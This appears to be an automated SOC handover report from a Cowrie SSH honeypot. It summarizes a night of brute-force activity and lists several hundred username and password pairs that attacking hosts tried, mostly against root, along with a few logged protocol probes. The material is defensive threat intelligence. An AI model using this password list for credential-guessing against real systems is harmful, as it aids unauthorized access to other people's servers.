# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-10 |
| **Generated At** | 2026-08-10T05:38:35Z |
| **Shift Time** | 05:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **354** |
| Confirmed Threats | **252** |
| False Positives Filtered | **102** (28.8%) |
| Unique Attacker IPs | **146** |
| Countries of Origin | **42** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **260** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **384** |
| Unique Credential Pairs | **327** |
| Unique Usernames | **16** |
| Unique Passwords | **321** |
| Successful Auth Pairs | **369** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 324 |
| `admin` | 12 |
| `support` | 10 |
| `unknown` | 5 |
| `ubnt` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 10 |
| `support` | 7 |
| `LeitboGi0ro` | 6 |
| `123@@@` | 4 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `root` | `LeitboGi0ro` | 6 |
| `admin` | `admin` | 6 |
| `root` | `123@@@` | 4 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test@` | `10.0.0.73` | 2026-08-10T00:55:07 |
| `root` | `gy120-` | `10.0.0.73` | 2026-08-10T00:55:21 |
| `root` | `Gdsoft321` | `10.0.0.73` | 2026-08-10T00:55:54 |
| `root` | `abcd112233` | `10.0.0.73` | 2026-08-10T00:56:17 |
| `root` | `Rj#9txL` | `10.0.0.73` | 2026-08-10T00:58:18 |
| `root` | `sina.com.cn` | `10.0.0.73` | 2026-08-10T00:58:31 |
| `root` | `qwer159` | `10.0.0.73` | 2026-08-10T00:58:44 |
| `root` | `!@#QWE456` | `10.0.0.73` | 2026-08-10T00:58:59 |
| `root` | `E168` | `10.0.0.73` | 2026-08-10T00:59:40 |
| `root` | `yj.123456` | `10.0.0.73` | 2026-08-10T01:00:46 |
| `root` | `cw01` | `10.0.0.73` | 2026-08-10T01:01:14 |
| `root` | `DX1` | `10.0.0.73` | 2026-08-10T01:01:33 |
| `root` | `tiand@123` | `10.0.0.73` | 2026-08-10T01:01:52 |
| `root` | `hr123` | `10.0.0.73` | 2026-08-10T01:02:36 |
| `root` | `11111` | `178.178.222.50` | 2026-08-10T01:02:49 |
| `root` | `allen.zhang` | `10.0.0.73` | 2026-08-10T01:02:51 |
| `root` | `11111` | `102.90.34.90` | 2026-08-10T01:02:56 |
| `root` | `sy120-` | `10.0.0.73` | 2026-08-10T01:03:16 |
| `root` | `~1EaseUs@AcsT` | `10.0.0.73` | 2026-08-10T01:03:23 |
| `root` | `qwe789` | `10.0.0.73` | 2026-08-10T01:03:31 |
| `root` | `Netbar8888` | `10.0.0.73` | 2026-08-10T01:04:56 |
| `root` | `manolo123` | `10.0.0.73` | 2026-08-10T01:06:19 |
| `root` | `werk6-` | `10.0.0.73` | 2026-08-10T01:06:37 |
| `root` | `prcmz2` | `10.0.0.73` | 2026-08-10T01:06:51 |
| `root` | `sage@4321` | `10.0.0.73` | 2026-08-10T01:07:41 |
| `unknown` | `99999` | `80.233.77.136` | 2026-08-10T01:08:03 |
| `Root` | `admin` | `10.0.0.73` | 2026-08-10T01:08:30 |
| `root` | `mm03` | `10.0.0.73` | 2026-08-10T01:08:37 |
| `root` | `kenny168` | `10.0.0.73` | 2026-08-10T01:09:10 |
| `Root` | `admin` | `111.70.32.11` | 2026-08-10T01:10:09 |
| `root` | `fi03` | `10.0.0.73` | 2026-08-10T01:10:38 |
| `root` | `nacy888` | `10.0.0.73` | 2026-08-10T01:10:44 |
| `root` | `drcom123` | `10.0.0.73` | 2026-08-10T01:11:57 |
| `root` | `PASSWORD12` | `10.0.0.73` | 2026-08-10T01:14:34 |
| `root` | `administrator12` | `10.0.0.73` | 2026-08-10T01:14:46 |
| `public` | `public` | `10.0.0.73` | 2026-08-10T01:16:26 |
| `root` | `admin456` | `10.0.0.73` | 2026-08-10T01:16:37 |
| `root` | `Test!1234` | `10.0.0.73` | 2026-08-10T01:17:10 |
| `root` | `1@Passw0rd` | `10.0.0.73` | 2026-08-10T01:17:43 |
| `root` | `king@123456` | `10.0.0.73` | 2026-08-10T01:18:27 |
| `root` | `king@1234567` | `10.0.0.73` | 2026-08-10T01:18:39 |
| `root` | `123456@Qwert` | `10.0.0.73` | 2026-08-10T01:18:57 |
| `root` | `Talent@12345` | `10.0.0.73` | 2026-08-10T01:19:30 |
| `root` | `admin123,` | `10.0.0.73` | 2026-08-10T01:19:59 |
| `root` | `Talent123@` | `10.0.0.73` | 2026-08-10T01:20:12 |
| `root` | `Zx12345678@` | `10.0.0.73` | 2026-08-10T01:20:38 |
| `root` | `1qa@WS1qa` | `10.0.0.73` | 2026-08-10T01:20:51 |
| `root` | `tgb123.com` | `10.0.0.73` | 2026-08-10T01:21:19 |
| `root` | `Liu123456789` | `10.0.0.73` | 2026-08-10T01:22:16 |
| `root` | `1Passw0rd12` | `10.0.0.73` | 2026-08-10T01:22:43 |
| `root` | `1Passwd` | `10.0.0.73` | 2026-08-10T01:22:55 |
| `root` | `1Passwd123` | `10.0.0.73` | 2026-08-10T01:23:09 |
| `root` | `1p@$$w0rd` | `10.0.0.73` | 2026-08-10T01:23:36 |
| `root` | `zxcvbnm@1234567` | `10.0.0.73` | 2026-08-10T01:25:29 |
| `root` | `admin` | `220.90.220.204` | 2026-08-10T01:25:57 |
| `root` | `qazWsx@` | `10.0.0.73` | 2026-08-10T01:26:17 |
| `Root` | `admin` | `111.70.23.240` | 2026-08-10T01:26:20 |
| `root` | `@Qaz123@` | `10.0.0.73` | 2026-08-10T01:26:36 |
| `root` | `!qaz321@` | `10.0.0.73` | 2026-08-10T01:27:06 |
| `root` | `!qazwsx123!` | `10.0.0.73` | 2026-08-10T01:29:27 |
| `root` | `!qaz1wsx1` | `10.0.0.73` | 2026-08-10T01:29:59 |
| `root` | `!qaz1wsx2` | `10.0.0.73` | 2026-08-10T01:30:07 |
| `support` | `support` | `176.53.159.196` | 2026-08-10T01:31:44 |
| `root` | `#qwer1` | `10.0.0.73` | 2026-08-10T01:32:07 |
| `root` | `qwer1asdf2` | `10.0.0.73` | 2026-08-10T01:32:47 |
| `root` | `Qwer1@1qwer` | `10.0.0.73` | 2026-08-10T01:33:49 |
| `root` | `!qwe12!12qwe` | `10.0.0.73` | 2026-08-10T01:35:37 |
| `root` | `Qwe@123!12` | `10.0.0.73` | 2026-08-10T01:36:10 |
| `root` | `Asdf1234!123` | `10.0.0.73` | 2026-08-10T01:36:18 |
| `root` | `Asdf123!12` | `10.0.0.73` | 2026-08-10T01:36:20 |
| `root` | `Qwe123@12` | `10.0.0.73` | 2026-08-10T01:36:49 |
| `unknown` | `99999` | `121.202.138.181` | 2026-08-10T01:37:06 |
| `unknown` | `99999` | `213.33.204.130` | 2026-08-10T01:37:14 |
| `root` | `Qwe123@` | `10.0.0.73` | 2026-08-10T01:37:45 |
| `root` | `Qwe1@asd` | `10.0.0.73` | 2026-08-10T01:38:10 |
| `root` | `Qwe!1asd` | `10.0.0.73` | 2026-08-10T01:38:24 |
| `root` | `!Qwe@12asd` | `10.0.0.73` | 2026-08-10T01:38:42 |
| `root` | `!Qwe@asd1` | `10.0.0.73` | 2026-08-10T01:39:12 |
| `root` | `Qwe12@123` | `10.0.0.73` | 2026-08-10T01:39:44 |
| `root` | `Qwe123asd12` | `10.0.0.73` | 2026-08-10T01:40:26 |
| `root` | `Qwe12asd1` | `10.0.0.73` | 2026-08-10T01:40:53 |
| `root` | `12qweasd1` | `10.0.0.73` | 2026-08-10T01:41:37 |
| `root` | `!qwe1@asd123` | `10.0.0.73` | 2026-08-10T01:42:10 |
| `root` | `asdf1234` | `190.57.233.133` | 2026-08-10T01:42:16 |
| `root` | `asdf1234` | `113.158.205.225` | 2026-08-10T01:42:24 |
| `root` | `Qwerty@123456!` | `10.0.0.73` | 2026-08-10T01:42:50 |
| `root` | `!qwerty@123456` | `10.0.0.73` | 2026-08-10T01:43:20 |
| `support` | `support11` | `117.191.83.250` | 2026-08-10T01:44:25 |
| `root` | `Qwerty123@321` | `10.0.0.73` | 2026-08-10T01:44:33 |
| `support` | `support11` | `178.178.194.131` | 2026-08-10T01:44:37 |
| `root` | `!1qwe!@qwe` | `10.0.0.73` | 2026-08-10T01:44:53 |
| `root` | `Asd1zxc1` | `10.0.0.73` | 2026-08-10T01:45:45 |
| `root` | `Asd1@zxc2` | `10.0.0.73` | 2026-08-10T01:46:32 |
| `root` | `Qwe1@23` | `10.0.0.73` | 2026-08-10T01:47:01 |
| `root` | `!admin@321` | `10.0.0.73` | 2026-08-10T01:50:46 |
| `root` | `@admin1234#` | `10.0.0.73` | 2026-08-10T01:53:09 |
| `root` | `@1admin@12` | `10.0.0.73` | 2026-08-10T01:54:40 |
| `root` | `@1admin123@` | `10.0.0.73` | 2026-08-10T01:55:06 |
| `root` | `1@admin@1` | `10.0.0.73` | 2026-08-10T01:55:15 |
| `root` | `12@admin12!` | `10.0.0.73` | 2026-08-10T01:56:21 |
| `stalker` | `stalker` | `92.62.233.214` | 2026-08-10T01:56:27 |
| `345gs5662d34` | `345gs5662d34` | `92.62.233.214` | 2026-08-10T01:56:30 |
| `stalker` | `3245gs5662d34` | `92.62.233.214` | 2026-08-10T01:56:31 |
| `root` | `@Aa12!` | `10.0.0.73` | 2026-08-10T01:56:54 |
| `root` | `@Aa12#` | `10.0.0.73` | 2026-08-10T01:57:18 |
| `root` | `@Aa123#` | `10.0.0.73` | 2026-08-10T01:57:20 |
| `root` | `!Aa1` | `10.0.0.73` | 2026-08-10T01:57:25 |
| `root` | `!Aa@123` | `10.0.0.73` | 2026-08-10T01:57:59 |
| `root` | `!Aa#12` | `10.0.0.73` | 2026-08-10T01:58:11 |
| `root` | `12@Aa` | `10.0.0.73` | 2026-08-10T01:58:53 |
| `root` | `12!Aa@` | `10.0.0.73` | 2026-08-10T01:59:20 |
| `root` | `Qq@12#` | `10.0.0.73` | 2026-08-10T02:00:34 |
| `root` | `Qq@123#` | `10.0.0.73` | 2026-08-10T02:00:41 |
| `support` | `support11` | `210.0.90.82` | 2026-08-10T02:00:43 |
| `root` | `Qq@123!` | `10.0.0.73` | 2026-08-10T02:00:46 |
| `root` | `Qq@1!` | `10.0.0.73` | 2026-08-10T02:01:00 |
| `root` | `@qw1@as1@` | `10.0.0.73` | 2026-08-10T02:03:47 |
| `root` | `@1qw@1as` | `10.0.0.73` | 2026-08-10T02:04:01 |
| `root` | `@as1@zx1` | `10.0.0.73` | 2026-08-10T02:04:21 |
| `root` | `Zxc!qwe1@` | `10.0.0.73` | 2026-08-10T02:06:15 |
| `root` | `Zxc321!123` | `10.0.0.73` | 2026-08-10T02:07:10 |
| `root` | `!zxc1@1qwe` | `10.0.0.73` | 2026-08-10T02:07:48 |
| `root` | `@zxc123@` | `10.0.0.73` | 2026-08-10T02:08:16 |
| `root` | `Zxc@cvb` | `10.0.0.73` | 2026-08-10T02:08:28 |
| `root` | `Zxc@cvb123` | `10.0.0.73` | 2026-08-10T02:09:09 |
| `root` | `!qaz!wsx` | `10.0.0.73` | 2026-08-10T02:10:03 |
| `root` | `!1qaz!2wsx@` | `10.0.0.73` | 2026-08-10T02:10:18 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-10T02:10:38 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-10T02:10:38 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-10T02:10:42 |
| `root` | `asdf1234` | `197.251.249.75` | 2026-08-10T02:11:12 |
| `root` | `Edc#123$` | `10.0.0.73` | 2026-08-10T02:11:32 |
| `root` | `Server!1234@` | `10.0.0.73` | 2026-08-10T02:12:05 |
| `root` | `1p@sswd123` | `10.0.0.73` | 2026-08-10T02:14:30 |
| `root` | `1passw0rd1` | `10.0.0.73` | 2026-08-10T02:15:04 |
| `user1` | `123456` | `10.0.0.73` | 2026-08-10T02:16:47 |
| `support` | `support` | `10.0.0.73` | 2026-08-10T02:17:55 |
| `root` | `Lenovo!@#` | `10.0.0.73` | 2026-08-10T02:18:26 |
| `user1` | `123456` | `75.80.65.214` | 2026-08-10T02:18:28 |
| `user1` | `123456` | `111.46.77.2` | 2026-08-10T02:18:36 |
| `root` | `QAZWSX123@` | `10.0.0.73` | 2026-08-10T02:18:47 |
| `root` | `QAZWSX!@#` | `10.0.0.73` | 2026-08-10T02:18:54 |
| `root` | `123WSXQAZ` | `10.0.0.73` | 2026-08-10T02:18:59 |
| `root` | `QAZWSXEDC123456` | `10.0.0.73` | 2026-08-10T02:19:27 |
| `root` | `123qwe.ASD` | `10.0.0.73` | 2026-08-10T02:19:33 |
| `root` | `Qaz2Wsx.Asd` | `10.0.0.73` | 2026-08-10T02:20:08 |
| `root` | `Qwerty...` | `10.0.0.73` | 2026-08-10T02:20:13 |
| `root` | `Qaz*Wsx` | `10.0.0.73` | 2026-08-10T02:20:48 |
| `root` | `nothing!@#` | `10.0.0.73` | 2026-08-10T02:21:22 |
| `root` | `abc.abc` | `10.0.0.73` | 2026-08-10T02:22:36 |
| `root` | `qwerty!@#.123` | `10.0.0.73` | 2026-08-10T02:22:58 |
| `root` | `12345678Ab` | `10.0.0.73` | 2026-08-10T02:24:34 |
| `root` | `XSWZAQ^%$#@!` | `10.0.0.73` | 2026-08-10T02:26:50 |
| `root` | `XSWQAZ!@#$%^` | `10.0.0.73` | 2026-08-10T02:27:07 |
| `root` | `XSWQAZ^%$#@!` | `10.0.0.73` | 2026-08-10T02:27:14 |
| `root` | `12qwer` | `10.0.0.73` | 2026-08-10T02:27:55 |
| `root` | `root10` | `10.0.0.73` | 2026-08-10T02:28:09 |
| `root` | `1Qwer` | `10.0.0.73` | 2026-08-10T02:28:22 |
| `root` | `1Q2w3e4r5` | `10.0.0.73` | 2026-08-10T02:29:45 |
| `root` | `!Qazqwe` | `10.0.0.73` | 2026-08-10T02:31:40 |
| `root` | `1234567qwe` | `10.0.0.73` | 2026-08-10T02:32:05 |
| `root` | `Zaq1123` | `10.0.0.73` | 2026-08-10T02:32:33 |
| `root` | `Qaz.1` | `10.0.0.73` | 2026-08-10T02:32:52 |
| `root` | `qaz.12345` | `10.0.0.73` | 2026-08-10T02:33:13 |
| `root` | `123Qaz` | `10.0.0.73` | 2026-08-10T02:34:14 |
| `root` | `123asdzxc` | `10.0.0.73` | 2026-08-10T02:34:28 |
| `root` | `123Zxc123` | `10.0.0.73` | 2026-08-10T02:34:47 |
| `root` | `zxczaq123` | `10.0.0.73` | 2026-08-10T02:34:52 |
| `root` | `Cxz321` | `10.0.0.73` | 2026-08-10T02:36:03 |
| `root` | `cxz123` | `10.0.0.73` | 2026-08-10T02:36:06 |
| `root` | `Qwer1` | `10.0.0.73` | 2026-08-10T02:36:30 |
| `root` | `qw.123` | `10.0.0.73` | 2026-08-10T02:36:43 |
| `root` | `Qw.12` | `10.0.0.73` | 2026-08-10T02:37:11 |
| `admin` | `admin` | `34.76.149.154` | 2026-08-10T02:37:34 |
| `root` | `Qwe.12` | `10.0.0.73` | 2026-08-10T02:37:36 |
| `root` | `123.Zxc` | `10.0.0.73` | 2026-08-10T02:37:48 |
| `root` | `qwerty.1` | `10.0.0.73` | 2026-08-10T02:39:14 |
| `root` | `123.Qw` | `10.0.0.73` | 2026-08-10T02:39:53 |
| `root` | `123.Qwerty` | `10.0.0.73` | 2026-08-10T02:40:11 |
| `root` | `12.Qwerty` | `10.0.0.73` | 2026-08-10T02:41:13 |
| `root` | `Qwer@1` | `10.0.0.73` | 2026-08-10T02:42:14 |
| `root` | `qwerty@12` | `10.0.0.73` | 2026-08-10T02:43:00 |
| `unknown` | `unknown1` | `182.79.218.164` | 2026-08-10T02:43:36 |
| `unknown` | `unknown1` | `94.228.240.2` | 2026-08-10T02:43:43 |
| `root` | `1234.qwert` | `10.0.0.73` | 2026-08-10T02:43:55 |
| `root` | `12@qw` | `10.0.0.73` | 2026-08-10T02:44:01 |
| `root` | `12@Qw` | `10.0.0.73` | 2026-08-10T02:44:27 |
| `root` | `1qwe1` | `10.0.0.73` | 2026-08-10T02:44:58 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-10T02:45:11 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-10T02:45:11 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-10T02:45:16 |
| `root` | `root10` | `180.188.253.150` | 2026-08-10T02:45:27 |
| `root` | `1qwe123456` | `10.0.0.73` | 2026-08-10T02:45:28 |
| `root` | `root10` | `183.167.234.154` | 2026-08-10T02:45:36 |
| `root` | `qwe!@#$%` | `10.0.0.73` | 2026-08-10T02:45:49 |
| `root` | `qwe11` | `10.0.0.73` | 2026-08-10T02:46:03 |
| `root` | `Qaz2wsx#` | `10.0.0.73` | 2026-08-10T02:47:11 |
| `root` | `Qaz2wsx#edc` | `10.0.0.73` | 2026-08-10T02:47:25 |
| `root` | `Qaz2w` | `10.0.0.73` | 2026-08-10T02:47:28 |
| `root` | `Qazwsx3` | `10.0.0.73` | 2026-08-10T02:48:45 |
| `root` | `!Qazwsx` | `10.0.0.73` | 2026-08-10T02:48:56 |
| `root` | `!qaz@w` | `10.0.0.73` | 2026-08-10T02:49:31 |
| `root` | `888888` | `42.240.164.208` | 2026-08-10T02:50:07 |
| `root` | `1Qaz2` | `10.0.0.73` | 2026-08-10T02:50:13 |
| `root` | `1Qaz2w` | `10.0.0.73` | 2026-08-10T02:50:18 |
| `345gs5662d34` | `345gs5662d34` | `42.240.164.208` | 2026-08-10T02:50:24 |
| `admin` | `1qazxsw2` | `103.31.39.188` | 2026-08-10T02:50:47 |
| `admin` | `1qazxsw2` | `65.20.158.10` | 2026-08-10T02:50:54 |
| `root` | `master` | `10.0.0.73` | 2026-08-10T02:51:08 |
| `root` | `!Qazcde3` | `10.0.0.73` | 2026-08-10T02:51:40 |
| `root` | `zaq1x` | `10.0.0.73` | 2026-08-10T02:52:28 |
| `root` | `Xsw21q` | `10.0.0.73` | 2026-08-10T02:54:07 |
| `root` | `Zaq1xsw2cd` | `10.0.0.73` | 2026-08-10T02:54:49 |
| `root` | `ZAQ!@wsx` | `10.0.0.73` | 2026-08-10T02:56:27 |
| `root` | `Zaq!xsw` | `10.0.0.73` | 2026-08-10T02:56:43 |
| `root` | `Zaq!@wsx` | `10.0.0.73` | 2026-08-10T02:56:49 |
| `root` | `zaq!2wsx3e` | `10.0.0.73` | 2026-08-10T02:58:43 |
| `root` | `zaq!@ws` | `10.0.0.73` | 2026-08-10T02:59:03 |
| `root` | `ZAQ!@W` | `10.0.0.73` | 2026-08-10T02:59:47 |
| `root` | `ZAQ!@#` | `10.0.0.73` | 2026-08-10T03:00:43 |
| `root` | `zaq.1` | `10.0.0.73` | 2026-08-10T03:01:17 |
| `root` | `zaq.111` | `10.0.0.73` | 2026-08-10T03:01:31 |
| `admin` | `1qazxsw2` | `10.0.0.73` | 2026-08-10T03:02:20 |
| `root` | `Zaq@123` | `10.0.0.73` | 2026-08-10T03:03:39 |
| `root` | `1Qw2` | `10.0.0.73` | 2026-08-10T03:03:59 |
| `root` | `1Qw2e3r4t5` | `10.0.0.73` | 2026-08-10T03:04:30 |
| `root` | `1Qw23` | `10.0.0.73` | 2026-08-10T03:04:32 |
| `root` | `1Qw23er` | `10.0.0.73` | 2026-08-10T03:04:46 |
| `root` | `1qw2e3r4t5y` | `10.0.0.73` | 2026-08-10T03:06:34 |
| `root` | `!Qw2e3r4t` | `10.0.0.73` | 2026-08-10T03:07:05 |
| `root` | `!Qw2e3r4t5y6` | `10.0.0.73` | 2026-08-10T03:07:27 |
| `root` | `Q12w` | `10.0.0.73` | 2026-08-10T03:07:47 |
| `root` | `!q2w3e4r5` | `10.0.0.73` | 2026-08-10T03:09:14 |
| `root` | `Q!w2e` | `10.0.0.73` | 2026-08-10T03:10:06 |
| `root` | `Zaq12WSX` | `10.0.0.73` | 2026-08-10T03:11:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.155.36` | 2026-08-10T03:11:23 |
| `*1` | `$4` | `207.175.155.36` | 2026-08-10T03:11:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9564` | `207.175.155.36` | 2026-08-10T03:11:33 |
| `root` | `123@@@` | `158.178.141.210` | 2026-08-10T03:12:59 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-08-10T03:13:01 |
| `root` | `!@#Qweasd` | `10.0.0.73` | 2026-08-10T03:14:35 |
| `root` | `QW1234` | `10.0.0.73` | 2026-08-10T03:15:01 |
| `root` | `QW12345` | `10.0.0.73` | 2026-08-10T03:15:17 |
| `root` | `Qwqw1234` | `10.0.0.73` | 2026-08-10T03:15:55 |
| `root` | `Qwqw12345` | `10.0.0.73` | 2026-08-10T03:16:03 |
| `root` | `qwqw12345` | `10.0.0.73` | 2026-08-10T03:16:55 |
| `root` | `qwqw123456` | `10.0.0.73` | 2026-08-10T03:17:02 |
| `root` | `Q1` | `10.0.0.73` | 2026-08-10T03:17:44 |
| `root` | `1z2x3` | `10.0.0.73` | 2026-08-10T03:18:57 |
| `root` | `1QW2E3R4` | `10.0.0.73` | 2026-08-10T03:22:22 |
| `root` | `1QW23E4` | `10.0.0.73` | 2026-08-10T03:22:31 |
| `root` | `q!w2e3` | `10.0.0.73` | 2026-08-10T03:23:10 |
| `root` | `q!w2e3r4` | `10.0.0.73` | 2026-08-10T03:23:18 |
| `root` | `!@12QWas` | `10.0.0.73` | 2026-08-10T03:24:49 |
| `ubnt` | `ubnt123` | `202.72.196.75` | 2026-08-10T03:24:49 |
| `root` | `!@12qQwsazx` | `10.0.0.73` | 2026-08-10T03:25:36 |
| `root` | `!@34qwerty` | `10.0.0.73` | 2026-08-10T03:26:52 |
| `ubnt` | `Password` | `14.194.128.158` | 2026-08-10T03:26:55 |
| `ubnt` | `Password` | `111.42.175.101` | 2026-08-10T03:27:04 |
| `root` | `!@QWASzx1` | `10.0.0.73` | 2026-08-10T03:27:37 |
| `root` | `!@QWaszx!@QW` | `10.0.0.73` | 2026-08-10T03:27:58 |
| `root` | `!@QWaszx1` | `10.0.0.73` | 2026-08-10T03:28:02 |
| `root` | `!@QWaszx123` | `10.0.0.73` | 2026-08-10T03:28:08 |
| `root` | `!@QWqwASas1` | `10.0.0.73` | 2026-08-10T03:28:29 |
| `root` | `!@as12as` | `10.0.0.73` | 2026-08-10T03:29:11 |
| `root` | `123@germany@hetzner` | `10.0.0.73` | 2026-08-10T03:29:29 |
| `root` | `1az2sx3dc` | `10.0.0.73` | 2026-08-10T03:29:57 |
| `root` | `google@12345` | `10.0.0.73` | 2026-08-10T03:30:23 |
| `root` | `god@123` | `10.0.0.73` | 2026-08-10T03:30:35 |
| `root` | `Qq@1234567890` | `10.0.0.73` | 2026-08-10T03:31:31 |
| `root` | `zaq!@wsxcde3` | `10.0.0.73` | 2026-08-10T03:32:03 |
| `root` | `!QAZzxc1qaz` | `10.0.0.73` | 2026-08-10T03:32:12 |
| `root` | `@wsxcde#` | `10.0.0.73` | 2026-08-10T03:32:44 |
| `root` | `Qwerty@1245` | `10.0.0.73` | 2026-08-10T03:33:09 |
| `root` | `!qaz2wsx1` | `10.0.0.73` | 2026-08-10T03:33:34 |
| `root` | `Qwerty@1236` | `10.0.0.73` | 2026-08-10T03:33:55 |
| `root` | `b@1` | `10.0.0.73` | 2026-08-10T03:34:16 |
| `root` | `a123456987` | `10.0.0.73` | 2026-08-10T03:35:24 |
| `root` | `!a@s#d$f%` | `10.0.0.73` | 2026-08-10T03:35:30 |
| `root` | `!QAZ1qaz123` | `10.0.0.73` | 2026-08-10T03:35:35 |
| `root` | `Qwerty@6yhn` | `10.0.0.73` | 2026-08-10T03:36:23 |
| `root` | `1q@W3e$r` | `10.0.0.73` | 2026-08-10T03:36:24 |
| `ubnt` | `ubnt123` | `10.0.0.73` | 2026-08-10T03:36:32 |
| `root` | `Qwe@00` | `10.0.0.73` | 2026-08-10T03:36:42 |
| `root` | `ZAQ!-@WSX` | `10.0.0.73` | 2026-08-10T03:37:01 |
| `root` | `xsw2.zaq1` | `10.0.0.73` | 2026-08-10T03:38:22 |
| `root` | `A123456789` | `10.0.0.73` | 2026-08-10T03:39:14 |
| `root` | `!z@y#x` | `10.0.0.73` | 2026-08-10T03:39:28 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.148.67` | 2026-08-10T03:40:03 |
| `*1` | `$4` | `207.175.148.67` | 2026-08-10T03:40:16 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9206` | `207.175.148.67` | 2026-08-10T03:40:18 |
| `root` | `!QAZ12345!QAZ` | `10.0.0.73` | 2026-08-10T03:40:55 |
| `root` | `!QAZ4esz` | `10.0.0.73` | 2026-08-10T03:41:35 |
| `root` | `windows-server` | `10.0.0.73` | 2026-08-10T03:41:40 |
| `root` | `Qwe@asd@123` | `10.0.0.73` | 2026-08-10T03:42:20 |
| `root` | `Qwe.ASD.123` | `10.0.0.73` | 2026-08-10T03:42:48 |
| `root` | `1QAZ_2WSX` | `10.0.0.73` | 2026-08-10T03:43:11 |
| `root` | `@WSX@!QAZ` | `10.0.0.73` | 2026-08-10T03:44:09 |
| `root` | `!QAZXCVGHJKLP` | `10.0.0.73` | 2026-08-10T03:46:49 |
| `root` | `Qwe@asd123456` | `10.0.0.73` | 2026-08-10T03:47:02 |
| `root` | `A.a.B.b.C.c.122` | `10.0.0.73` | 2026-08-10T03:47:41 |
| `guest` | `123` | `119.200.229.33` | 2026-08-10T03:48:50 |
| `guest` | `123` | `103.83.23.169` | 2026-08-10T03:48:58 |
| `guest` | `123` | `59.93.36.136` | 2026-08-10T03:48:59 |
| `root` | `qwe12` | `10.0.0.73` | 2026-08-10T03:49:14 |
| `root` | `Qq@666666` | `10.0.0.73` | 2026-08-10T03:49:41 |
| `root` | `2wsx_zaq1` | `10.0.0.73` | 2026-08-10T03:51:07 |
| `root` | `Qwe@1!` | `10.0.0.73` | 2026-08-10T03:51:14 |
| `root` | `!QAZ@WSz` | `10.0.0.73` | 2026-08-10T03:51:41 |
| `root` | `Home12345678` | `10.0.0.73` | 2026-08-10T03:52:47 |
| `ubnt` | `ubnt123` | `207.219.221.101` | 2026-08-10T03:53:44 |
| `root` | `Qwe@Asd@123` | `10.0.0.73` | 2026-08-10T03:53:59 |
| `root` | `1qaz22wsx3edc` | `10.0.0.73` | 2026-08-10T03:54:07 |
| `root` | `#Edcxsw2` | `10.0.0.73` | 2026-08-10T03:54:11 |
| `root` | `Qwerty@33` | `10.0.0.73` | 2026-08-10T03:55:00 |
| `root` | `Qwe@5rdx` | `10.0.0.73` | 2026-08-10T03:55:34 |
| `root` | `Qwerty@22` | `10.0.0.73` | 2026-08-10T03:57:26 |
| `root` | `Qwe@22` | `10.0.0.73` | 2026-08-10T03:58:05 |
| `root` | `Qwe@1231xsw` | `10.0.0.73` | 2026-08-10T03:58:24 |
| `root` | `Qwe@111` | `10.0.0.73` | 2026-08-10T03:58:41 |
| `root` | `ZXCASDQWE123` | `10.0.0.73` | 2026-08-10T03:58:59 |
| `root` | `aa1234561` | `10.0.0.73` | 2026-08-10T03:59:39 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-10T04:00:41 |
| `root` | `aaa00` | `10.0.0.73` | 2026-08-10T04:01:04 |
| `admin` | `bywifi` | `222.236.155.146` | 2026-08-10T04:01:08 |
| `root` | `AAA00` | `10.0.0.73` | 2026-08-10T04:01:24 |
| `root` | `AA22` | `10.0.0.73` | 2026-08-10T04:01:52 |
| `root` | `AAA333` | `10.0.0.73` | 2026-08-10T04:02:31 |
| `root` | `aaaa4444` | `10.0.0.73` | 2026-08-10T04:02:57 |
| `root` | `qweasdzxc!@#` | `10.0.0.73` | 2026-08-10T04:04:02 |
| `root` | `Ws1122334455` | `10.0.0.73` | 2026-08-10T04:04:16 |
| `root` | `123` | `92.118.39.14` | 2026-08-10T04:09:38 |
| `root` | `1234` | `92.118.39.14` | 2026-08-10T04:12:07 |
| `dexin` | `dexin123` | `69.6.234.27` | 2026-08-10T04:14:00 |
| `345gs5662d34` | `345gs5662d34` | `69.6.234.27` | 2026-08-10T04:14:02 |
| `dexin` | `3245gs5662d34` | `69.6.234.27` | 2026-08-10T04:14:03 |
| `root` | `12345` | `92.118.39.14` | 2026-08-10T04:14:35 |
| `admin` | `admin` | `121.40.20.65` | 2026-08-10T04:15:28 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.35.41` | 2026-08-10T04:16:35 |
| `*1` | `$4` | `207.175.35.41` | 2026-08-10T04:16:49 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2860` | `207.175.35.41` | 2026-08-10T04:16:51 |
| `admin` | `bywifi` | `111.171.125.94` | 2026-08-10T04:17:29 |
| `admin` | `bywifi` | `39.164.94.190` | 2026-08-10T04:17:42 |
| `root` | `1234567` | `92.118.39.14` | 2026-08-10T04:19:29 |
| `root` | `12345678` | `92.118.39.14` | 2026-08-10T04:21:50 |
| `root` | `sipwise` | `59.48.39.222` | 2026-08-10T04:23:22 |
| `root` | `sipwise` | `87.103.126.54` | 2026-08-10T04:23:33 |
